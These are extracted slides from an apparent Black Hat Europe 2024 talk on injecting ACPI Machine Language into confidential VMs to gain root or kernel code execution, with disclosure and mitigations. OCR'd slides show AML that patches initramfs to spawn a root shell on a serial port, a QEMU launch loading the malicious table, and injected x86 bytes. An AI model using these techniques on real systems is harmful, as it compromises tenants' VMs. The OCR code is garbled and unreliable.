---
title: "AML Injection Attacks on Confidential VMs"
speakers: ["Satoru Takekoshi", "Manami Mori", "Takaaki Fukai", "Takahiro Shinagawa"]
conference: "Black Hat"
conference_full: "Black Hat Europe 2024"
edition: "Europe"
year: 2024
source_pdf: "BlackHat_Europe_2024_slides/Satoru Takekoshi & Manami Mori & Takaaki Fukai & Takahiro Shinagawa_AML Injection Attacks on Confidential VMs.pdf"
pages: 47
sha256: "af2a90936554b89d3b8f3f2f89b74917a1c7343f18ae815f0fb10e0e42db567a"
text_chars: 14801
ocr_pages: 5
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:51:43Z"
---
# AML Injection Attacks on Confidential VMs

**Speakers:** Satoru Takekoshi, Manami Mori, Takaaki Fukai, Takahiro Shinagawa  
**Conference:** Black Hat Europe 2024  
**Source:** `BlackHat_Europe_2024_slides/Satoru Takekoshi & Manami Mori & Takaaki Fukai & Takahiro Shinagawa_AML Injection Attacks on Confidential VMs.pdf` (47 pages)


## Slide 1

# AML Injection Attacks on Confidential VMs

Speaker(s): **Satoru Takekoshi**<sup>**1**</sup> **, Manami Mori**<sup>**2**</sup> , Takaaki Fukai<sup>3</sup> , Takahiro Shinagawa<sup>1</sup>

1 The University of Tokyo, 2 Tokyo Metropolitan University,

3 National Institute of Advanced Industrial Science and Technology

#BHEU @BlackHatEvents

## Slide 2

### Outline

- Introduction to a Confidential VM (Virtual Machine)

- Overview of AML (ACPI Machine Language)

- Our Proposal: AML Injection Attack

- Case studies: Linux and Windows

- Mitigation Strategies

- Takeaways

Information Classification: General

#BHEU @BlackHatEvents

2

## Slide 3

### Introduction to a Confidential VM

Information Classification: General

#BHEU @BlackHatEvents

3

## Slide 4

## **Traditional Virtual Machine**

##### **Virtual Machine (VM)**

Use the cloud.
upload
Cloud user

Trust us!
Sensitive Data
full access
Cloud vendor
E.g., Amazon EC2 and Google GCP

Information Classification: General

#BHEU @BlackHatEvents

4

## Slide 5

## **Confidential Virtual Machine**

Confidential VM
(CVM)

Keep my secret!
Sensitive Data
upload
Cloud user

No need to
trust us!
Cloud vendor

Information Classification: General

#BHEU @BlackHatEvents

5

## Slide 6

## **Encryption in CVM**

CVM
User’s Sensitive Data
🔒
Cloud user Cloud vendor
CPU
🔑
6 #BHEU @BlackHatEvents

Information Classification: General

#BHEU @BlackHatEvents

## Slide 7

## **Attestation in CVM**

CVM
Attestation
OS and firmware
are legitimate!
Guest OS
Cloud user Cloud vendor
Firmware
CPU
Information Classification: General 7 #BHEU @BlackHatEvents

Information Classification: General

#BHEU @BlackHatEvents

## Slide 8

## **Threat Model in CVM**

## **_Untrusted_**

CVM

Cloud user

Cloud vendor

**_Trusted_**

**CPU**

Information Classification: General

#BHEU @BlackHatEvents

8

## Slide 9

## **Commercialized CVM**

#### **Cloud Vendors**

GCP Confidential VM instances

Amazon EC2 instance with AMD SEV-SNP **CPU Vendors**

AMD SEV-SNP

Intel TDX

Azure Confidential VMs

Information Classification: General

#BHEU @BlackHatEvents

9

## Slide 10

### Overview of AML

Information Classification: General

#BHEU @BlackHatEvents

10

## Slide 11

## **ACPI Machine Language (AML)**

- ACPI = Advanced Configuration and Power Interface

OS Kernel
(executed by the kernel)
AML Code
Firmware
ACPI Table
Control hardware
AML Code
(e.g. power off)
Hardware

Information Classification: General

#BHEU @BlackHatEvents

11

## Slide 12

AML Example

<- if statement <- memory access

Information Classification: General

#BHEU @BlackHatEvents

12

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
biSekhat AML Example =
EUROPE 2024
OperationRegion (PADM, SystemMemory, @xFED3C@00, 0x100@0)
Field (PADM, DWordAcc, NoLock, WriteAsZeros)
{
PRID, 327
OsTi, mee
OSsT2, 32
}
Device (\_SB.VMOD.PAD1)
{
Name (_CID, "Virtual Processor Aggregator Device") // _CID: Compatible ID
Name (_HID, "ACPI@@@C" /*x Processor Aggregator Device */) // _HID: Hardware ID
Method (_PUR, @, NotSerialized) // _PUR: Processor Utilization Request
{
Name (PUR, Package (@x0@2)
{
One,
Zero
})
PUR [One] = PRID /* \PRID x/
Return (PUR) /* \_SB_.VMOD.PAD1._PUR.PUR_ */
}
Method (_OST, 3, Serialized) // _OST: OSPM Status Indication
{
If ((Argi == Zero))) <a if statement
v
OST2 = Arg2
}
OST1 = Argl <- memory aCCess
Information Classification: General
```

## Slide 13

## **ACPI Rootkit**

###### (Black Hat Europe 2006)

###### • Exploit ACPI to install Rootkit

OS Kernel
Rootkit
Firmware (BIOS)
ACPI Table
AML Code
Hardware
Flash ROM

Information Classification: General

#BHEU @BlackHatEvents

13

## Slide 14

## **AML in the Cloud**

CVM
OS Kernel
Firmware
Cloud user Cloud vendor
ACPI Table
AML Code
Host
ACPI Table
Customize ACPI
14 #BHEU @BlackHatEvents

Information Classification: General

## Slide 15

## **AML Attestation in CVM**

CVM
Attestation
AML is legitimate!
(when the CVM boots)
OS Kernel
Firmware
Cloud user Cloud vendor
ACPI Table
AML Code
AML attestation is
indispensable!
Host
ACPI Table
Customize ACPI

Information Classification: General

#BHEU @BlackHatEvents

15

## Slide 16

### Our Proposal: AML Injection Attack

Information Classification: General

#BHEU @BlackHatEvents

16

## Slide 17

## **AML Injection**

CVM
Attestation
AML was legitimate!
(when the CVM boots)
OS Kernel
Firmware
Cloud user Cloud vendor
AML Code Runtim e Interface
Inject AML at Runtime!
Host

Information Classification: General

#BHEU @BlackHatEvents

17

## Slide 18

## **AML Injection Attack**

CVM
Attestation
AML was legitimate!
OS Kernel
(when the CVM boots)
Arbitrary Code Execution
Arbitrary Code
AML Code
Firmware
Cloud user Cloud vendor
AML Code Runtim e Interface
Host
Information Classification: General 18 #BHEU @BlackHatEvents

Information Classification: General

## Slide 19

### Linux Case Study

Information Classification: General

#BHEU @BlackHatEvents

19

## Slide 20

## **Linux: AML Injection**

CVM
Attestation
Linux Kernel
OVMF Firmware
Cloud user Cloud vendor
AML Code QEM U fw_cfg
Inject AML
via QEMU Firmware Configuration
(fw_cfg) Device
QEMU Host

Information Classification: General

#BHEU @BlackHatEvents

20

## Slide 21

## **Linux: AML Injection Attack**

CVM
Attestation
Linux Kernel
Root Shell Access!
Root Shell ttyS1
AML Code initramfs
OVMF Firmware
Cloud user Cloud vendor
AML Code QEM U fw_cfg
QEMU Host
21 #BHEU @BlackHatEvents

Information Classification: General

## Slide 22

## **Linux: Injected AML**

Information Classification: General

#BHEU @BlackHatEvents

22

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisekchat Linux: Injected AML
EUROPE 2024
Local@ = ADDR /* The value from "efi: INITRD=@x..." */
Local® += 0x26360 /* Offset */
/* Start patching... */
/* Note: "Local@++" is equal of "++lLocal@" at C */
DUMP (PTCH(Localé@, @x63)))/* 'c! x*/
DUMP (PTCH(Local@++, @x64)))j/* 'd' */
DUMP (PTCH(Local0++, @x20))//*x ' ' x*/
DUMP (PTCH(Local0++, @x72))//* 'r' */
DUMP (PTCH(Local0++, @x6F)))/* 'o' */
DUMP (PTCH(Local@++, @x6F))j/* 'o' */
DUMP (PTCH(Local@++, @x74))//* 't' */
DUMP(PTCH(Local0++, @x20))/* ' ' */
DUMP (PTCH(Local@++, @x26))|j//*x '&!' */
DUMP (PTCH(Local@++, @x26))/j//*x '&!' */
DUMP (PTCH(Local0++, @x20)) /* ' ' x*/
DUMP (PTCH(Local0++, @x73)))/* 's' */
DUMP(PTCH(Local@++, @x68))//* 'h' */
DUMP (PTCH(Local@++, @x2@)))/* ' ' x/
DUMP (PTCH(Local@++, @x3C)) j/* '<' */
DUMP (PTCH(Local0++, @x2F)))/* '/' x*/
DUMP (PTCH(Local@++, @x64))|j//*x 'd' */
DUMP (PTCH(Local@++, @x65))|//*x 'e' */
DUMP(PTCH(Local0++, @x76))//* 'v' x*/
DUMP (PTCH(Local0++, @x2F)))/* '/' x*/
DUMP(PTCH(Local@++, @x74))\j/x 't!' */
DUMP(PTCH(Local@++, @x74))|///x */
DUMP (PTCH(Local@++, @x79)))/x* */
DUMP (PTCH(Local0++, @x53))|/x* */
DUMP (PTCH(Local0++, x31) ) |/x* */
Information Classification: General
```

## Slide 23

## **Linux: Demo**

Information Classification: General

#BHEU @BlackHatEvents

23

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat Linux: Demo
EUROPE 2024
ts22mori@epyc-eval-sev2: ~/AMDSEV — ssh « ssh epyc_sev
#!/bin/sh
sudo /home/fukai/AMDSEV/usr/local/bin/qemu-system-x86_64 \
~-enable-kvm \
-cpu EPYC-v4 \
-machine q35 \
-smp \
—m 2048M \
-kernel ./guest-images/vmlinuz~6.7.0-snp-guest-98543c2aa649 \
-initrd ./guest-images/initrd \
-append * e\
-drive if=pflash, format=raw, unit=0, file=./ovmf/Build/AmdSev/DEBUG_GCC5/FV/OVMF.fd,readonly \
~drive file=/home/fukai/vms/badaml_test.qcow2, jone, id=disk@, format=qcow2 \
-device virtio-scsi-pci, id=scsi@, disable-legacy=on, iommu_platform=true \
-device scsi-hd,driv jiske \
-machine memory-encryption=sev@,vmport=off \
-object memory-backend-memfd, id=ram1, size=2048M, share=true,prealloc=true \
~machine memory-backend=ram1 \
object sev-snp-guest, id=sev@, cbitpos=51, reduced-phys-bits=1,kernel-hashes=on \
-nographic \
-monitor none \
-serial stdio \
~serial telnet ,server,nowait \
-acpitable file=SHOME/bad_aml.aml
“run.sh" 24L, 10218
Information Classification: General
```

## Slide 24

### Windows Case Study

Information Classification: General

#BHEU @BlackHatEvents

24

## Slide 25

## **Windows: AML Injection**

CVM
Attestation
Windows Kernel
Azure Firmware
Cloud user Cloud vendor
AML Code Undocu mented I/F
Inject AML!
Azure Host

Information Classification: General

#BHEU @BlackHatEvents

25

## Slide 26

## **Windows: AML Injection Attack**

CVM
Attestation
Arbitrary Code Execution
Windows Kernel
in Windows Kernel
Arbitrary Code
UEFI
AML Code
Runtime Service
Azure Firmware
Cloud user Cloud vendor
AML Code Undocu mented I/F
Azure Host
26 #BHEU @BlackHatEvents

Information Classification: General

## Slide 27

## **Windows: Injected AML**

###### **jmp inst.**

**our code**

Information Classification: General

#BHEU @BlackHatEvents

27

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisekchat Windows: Injected AML
EUROPE 2024
Method (_INI, @, Serialized)
{
T8000
TQ@1
TQ@2
TQe3
TQ04
Ce00
CQe@1
C002
Cee3
C004
C805
CQ06
C007
C808
Cee9
CO0A
CQ@B
CeeC
CeeD
Q@xE9
Q@x32
Q@x6E
Zero
Zero
@x4C
@x8B
Q@x54
Q@x24
@x48
@x50
@x53
0x48
Q@x81
@xEC
@x80
0x02
Zero
Zero
Information Classification: General
```

## Slide 28

## **Windows: Notes on the Demo**

- **<u>This is a simulation!</u>**

   - We inject the AML code through a debugging feature

      - We don't have access to the Azure host

   - We also disabled Secure Boot to enable debugging

      - We didn’t change the program of firmware, bootloader, and Windows kernel

- Still, the proof of latter two techniques

   - UEFI Runtime Service is writable with AML

   - Arbitrary code is executed in Windows kernel

Information Classification: General

#BHEU @BlackHatEvents

28

## Slide 29

## **Windows: Demo**

Information Classification: General

#BHEU @BlackHatEvents

29

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pisckchat Windows: Demo
EUROPE 2024
Windows CVM
on Azure
Test Mode
Windows Server 2022 Datacenter
Build 20348.fe_release.210507-1500
```

## Slide 30

### Azure Details

- How did we find undocumented interfaces?

- Are these interfaces exploitable?

Information Classification: General

#BHEU @BlackHatEvents

30

## Slide 31

## **Azure: Undisclosed Firmware**

- We dumped and analyzed firmware

   **1. Boot** a Windows CVM with kernel debugger enabled

   **2. Stop** the CVM during the boot

   **3. Scan** the whole memory to find a firmware magic value

Information Classification: General

#BHEU @BlackHatEvents

31

## Slide 32

## **Azure: Undisclosed Firmware**

- We dumped and analyzed firmware

   **1. Boot** a Windows CVM with kernel debugger enabled

   **2. Stop** the CVM during the boot

   **3. Scan** the whole memory to find a firmware magic value

Information Classification: General

#BHEU @BlackHatEvents

32

## Slide 33

## **Azure: Undisclosed Firmware**

- We dumped and analyzed firmware

   **1. Boot** a Windows CVM with kernel debugger enabled

   **2. Stop** the CVM during the boot

   **3. Scan** the whole memory to find a firmware magic value

Information Classification: General

#BHEU @BlackHatEvents

33

## Slide 34

## **Azure: Undisclosed Firmware**

- We dumped and analyzed firmware

   **1. Boot** a Windows CVM with kernel debugger enabled

   **2. Stop** the CVM during the boot

   **3. Scan** the whole memory to find a firmware magic value

Information Classification: General

#BHEU @BlackHatEvents

34

## Slide 35

## **Azure: Two Undocumented I/F**

###### **“PCAT BIOS helper”** Interface

**“UEFI config blob”** Interface

Information Classification: General

#BHEU @BlackHatEvents

35

## Slide 36

## **Azure: Current Architecture**

CVM
Attestation
We cannot inject
Really?
(What is Paravisor...?) Guest OS AML!
Azure Firmware
VTL0
Cloud user Undocumented I/F Cloud vendor
VTL2
Paravisor
Azure Host

Information Classification: General

#BHEU @BlackHatEvents

36

## Slide 37

## **Azure: Unattestable CVM**

?
CVM
Attestation
Trust us
Guest OS on Paravisor!
Closed source ? Azure Firmware
Undocumented I/F Cloud vendor
Proprietary! ❌ Paravisor (HCL)
Azure Host
Information Classification: General 37 #BHEU @BlackHatEvents

Information Classification: General

## Slide 38

## **Azure: Open Source Paravisor**

- OpenHCL source code is recently released

   - OpenVMM and OpenHCL Linux kernel

      - <u>https://github.com/microsoft/openvmm</u>

- Firmware source code is also released

   - msvm

   - <u>https://github.com/microsoft/mu_msvm</u>

- OpenHCL is **not** used in Azure (yet?)

Information Classification: General

#BHEU @BlackHatEvents

38

## Slide 39

### Mitigation Strategies

Information Classification: General

#BHEU @BlackHatEvents

39

## Slide 40

## **1. Do Measured Boot with vTPM!**

CVM
Attestation
Measured Boot
Linux Kernel
OVMF Firmware
Cloud user Cloud vendor
vTPM
Do measured boot
vTPM Quote
and verify vTPM Quote
QEMU Host
Information Classification: General 40 #BHEU @BlackHatEvents

Information Classification: General

## Slide 41

## **Coordinated Disclosure with AMD**

- We reported the issue to AMD in May 2024

      - AMD have provided notification to impacted partners

- AMD released a public security brief (AMD-SB-3012) on Decemter 9<sup>th</sup> 2024

   - _“AMD recommends the use of_ **_<u>vTPM to perform a measured boot</u>_** _<u>that includes measurements over all ACPI tables”</u>_

   - **Preview code for vTPM** (no support in upstream QEMU yet)

         - Coconut-SVSM: https://github.com/coconut-svsm/svsm

         - Linux: https://github.com/coconut-svsm/linux/commits/svsm

         - OVMF: https://github.com/coconut-svsm/edk2/tree/svsm

         - Qemu: https://github.com/coconut-svsm/qemu/tree/svsm-igvm

Information Classification: General

#BHEU @BlackHatEvents

41

## Slide 42

## **2. Make Everything Attestable!**

CVM
Attestation
All code is We release
attestable! Guest OS attestable code!
Azure Firmware
Cloud user Undocumented I/F Cloud vendor
Paravisor
Azure Host

Information Classification: General

#BHEU @BlackHatEvents

42

## Slide 43

## **Discussion with Microsoft**

- We reported the issue to Microsoft in July 2024

   - Microsoft said _“the host does not control the content of these structures (ACPI tables)”_

   - But...

- **Users must trust Microsoft!**

   - _“The HCL is developed by Microsoft, and as such, CVM users do need to place a level of trust in Microsoft as the cloud operator”_

- **Paravisor (HCL) is not attestable!**

   - _“binaries and source code for HCL are not publicly available”_

- **Microsoft recently released Paravisor source code!**

   - But, HCL is not OpenHCL

Information Classification: General

#BHEU @BlackHatEvents

43

## Slide 44

## **3. Improve AML Security!**

CVM
Attestation
AML is legitimate!
OS Kernel
Firmware
Cloud user ACPI Table Cloud vendor
AML Code
How do ve verify the
vendor-specific  AML code?
Host
ACPI Table
AML Code
Customize ACPI

Information Classification: General

#BHEU @BlackHatEvents

44

## Slide 45

## **Future Directions**

- Enhance AML interpreters

   - Simple sandboxing in Windows

      - Bypassed by our attack

   - Fine-grained sandboxing

- Enhance AML Verification

   - Simple Verification

   - Formal Verification

Information Classification: General

#BHEU @BlackHatEvents

45

## Slide 46

### Takeaway

Information Classification: General

#BHEU @BlackHatEvents

46

## Slide 47

## **Takeaways**

- For cloud users:

   - **<u>DO measured boot</u>** with vTPMs for CVMs

      - Otherwise, there is a risk of arbitrary code execution by cloud vendors

- For cloud vendors:

   - Make **<u>everything attestable</u>**

      - Release attestable code

- For communities:

   - Find a way to **<u>improve AML security</u>**

      - Need long-term efforts

Information Classification: General

#BHEU @BlackHatEvents

47
